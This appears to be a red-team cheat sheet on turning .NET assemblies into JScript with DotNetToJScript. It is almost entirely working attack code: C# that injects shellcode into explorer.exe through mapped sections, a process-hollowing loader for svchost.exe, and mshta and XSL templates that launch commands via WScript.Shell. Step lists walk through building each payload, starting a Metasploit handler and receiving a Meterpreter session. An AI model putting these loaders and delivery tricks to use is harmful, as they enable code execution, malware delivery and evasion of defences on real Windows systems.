

## DOTNETTOJSCRIPT -- MOD 4.2.2

```
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

[ComVisible(true)]
public class TestClass
{
    public TestClass()
    {
        MessageBox.Show("Test", "Test", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        ProcessStartInfo p = new ProcessStartInfo("cmd.exe");
        Process proc = new Process();
        proc.StartInfo = p;
        proc.Start();
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```
- save
- set release NOT debug
- build → build solution
- `DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o cmd.js`
- doubleclick on cmd.js and cmd.exe should pop




---
## LOW-LEVEL PROCESS INJECTION WITH DOTNETTOJSCRIPT

//this creates .dll to be executed with dotnettojscript.exe

```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;

[ComVisible(true)]
public class TestClass
{
	// OpenProcess - kernel32.dll
	[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
	static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

	// CreateRemoteThread - kernel32.dll
	[DllImport("kernel32.dll")]
	static extern IntPtr CreateRemoteThread(
		IntPtr hProcess,
		IntPtr lpThreadAttributes,
		uint dwStackSize,
		IntPtr lpStartAddress,
		IntPtr lpParameter,
		uint dwCreationFlags,
		IntPtr lpThreadId);

	// GetCurrentProcess - kernel32.dll
	[DllImport("kernel32.dll", SetLastError = true)]
	static extern IntPtr GetCurrentProcess();

	// ntdll.dll API functions:
	// NtCreateSection
	[DllImport("ntdll.dll")]
	public static extern UInt32 NtCreateSection(
		ref IntPtr section,
		UInt32 desiredAccess,
		IntPtr pAttrs,
		ref long MaxSize,
		uint pageProt,
		uint allocationAttribs,
		IntPtr hFile);

	// NtMapViewOfSection
	[DllImport("ntdll.dll")]
	public static extern UInt32 NtMapViewOfSection(
		IntPtr SectionHandle,
		IntPtr ProcessHandle,
		ref IntPtr BaseAddress,
		IntPtr ZeroBits,
		IntPtr CommitSize,
		ref long SectionOffset,
		ref long ViewSize,
		uint InheritDisposition,
		uint AllocationType,
		uint Win32Protect);

	// NtUnmapViewOfSection
	[DllImport("ntdll.dll", SetLastError = true)]
	static extern uint NtUnmapViewOfSection(
		IntPtr hProc,
		IntPtr baseAddr);

	// NtClose
	[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
	static extern int NtClose(IntPtr hObject);
	public TestClass()
    {
		byte[] buf = new byte[] { <SHELLCODE> };
		long buffer_size = buf.Length;



		// Create the section handle.
		IntPtr ptr_section_handle = IntPtr.Zero;
		UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, 0xe, IntPtr.Zero, ref buffer_size, 0x40, 0x08000000, IntPtr.Zero);
		if (create_section_status != 0 || ptr_section_handle == IntPtr.Zero)
		{
			Console.WriteLine("[-] An error occured while creating the section.");
			return;
		}
		Console.WriteLine("[+] The section has been created successfully.");
		Console.WriteLine("[*] ptr_section_handle: 0x" + String.Format("{0:X}", (ptr_section_handle).ToInt64()));



		// Map a view of a section into the virtual address space of the current process.
		long local_section_offset = 0;
		IntPtr ptr_local_section_addr = IntPtr.Zero;
		UInt32 local_map_view_status = NtMapViewOfSection(ptr_section_handle, GetCurrentProcess(), ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x04);

		if (local_map_view_status != 0 || ptr_local_section_addr == IntPtr.Zero)
		{
			Console.WriteLine("[-] An error occured while mapping the view within the local section.");
			return;
		}
		Console.WriteLine("[+] The local section view's been mapped successfully with PAGE_READWRITE access.");
		Console.WriteLine("[*] ptr_local_section_addr: 0x" + String.Format("{0:X}", (ptr_local_section_addr).ToInt64()));



		// Copy the shellcode into the mapped section.
		Marshal.Copy(buf, 0, ptr_local_section_addr, buf.Length);



		// Map a view of the section in the virtual address space of the targeted process.
		var process = Process.GetProcessesByName("explorer")[0];
		IntPtr hProcess = OpenProcess(0x001F0FFF, false, process.Id);
		IntPtr ptr_remote_section_addr = IntPtr.Zero;
		UInt32 remote_map_view_status = NtMapViewOfSection(ptr_section_handle, hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x20);

		if (remote_map_view_status != 0 || ptr_remote_section_addr == IntPtr.Zero)
		{
			Console.WriteLine("[-] An error occured while mapping the view within the remote section.");
			return;
		}
		Console.WriteLine("[+] The remote section view's been mapped successfully with PAGE_EXECUTE_READ access.");
		Console.WriteLine("[*] ptr_remote_section_addr: 0x" + String.Format("{0:X}", (ptr_remote_section_addr).ToInt64()));



		// Unmap the view of the section from the current process & close the handle.
		NtUnmapViewOfSection(GetCurrentProcess(), ptr_local_section_addr);
		NtClose(ptr_section_handle);

		CreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);
		return;
	}

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```




---
## PROCESS HOLLOWING VIA DOTNETTOJSCRIPT



- swap in x64 shellcode
- set up and run multi/handler
- set cpu arch x64
- build solution
- put the 3 files together
- run `dotnettojscript.exe exampleassembly.dll --lang=jscript --ver=v4 -o hollow.js`
- exec hollow.js and get meterpreter back

```
//    This file is part of DotNetToJScript.
//    Copyright (C) James Forshaw 2017
//
//    DotNetToJScript is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    DotNetToJScript is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with DotNetToJScript.  If not, see <http://www.gnu.org/licenses/>.

using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;

[ComVisible(true)]
public class TestClass
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    struct STARTUPINFO
    {
        public Int32 cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;

    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr Reserved1;
        public IntPtr PebAddress;
        public IntPtr Reserved2;
        public IntPtr Reserved3;
        public IntPtr UniquePid;
        public IntPtr MoreReserved;
    }


    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint ResumeThread(IntPtr hThread);
    public TestClass()
    {
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

        bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

        PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
        uint tmp = 0;
        IntPtr hProcess = pi.hProcess;
        ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

        IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

        byte[] addrBuf = new byte[IntPtr.Size];
        IntPtr nRead = IntPtr.Zero;
        ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

        IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

        byte[] data = new byte[0x200];
        ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

        uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

        uint opthdr = e_lfanew_offset + 0x28;

        uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

        IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

        byte[] buf = new byte[683] { <SHELLCODE> };

        WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

        ResumeThread(pi.hThread);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```



---
## MSHTA WITH EMBEDDED DOTNETTOJSCRIPT

```
<html> 
<head> 
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
</script>
</head> 
<body>
<script language="JScript">
self.close();
</script>
</body> 
</html>
```

//replace jscript met shellcode within `<script>` tags




---
## XSL TRANSFORM WITH DOTNETTOJSCRIPT

```
<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">

<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
		<![CDATA[
			var r = new ActiveXObject("WScript.Shell");
			r.Run("cmd.exe");
		]]>
	</ms:script>
</stylesheet>
```

//replace our dotnettojscript payload inside CDATA tags and we're good














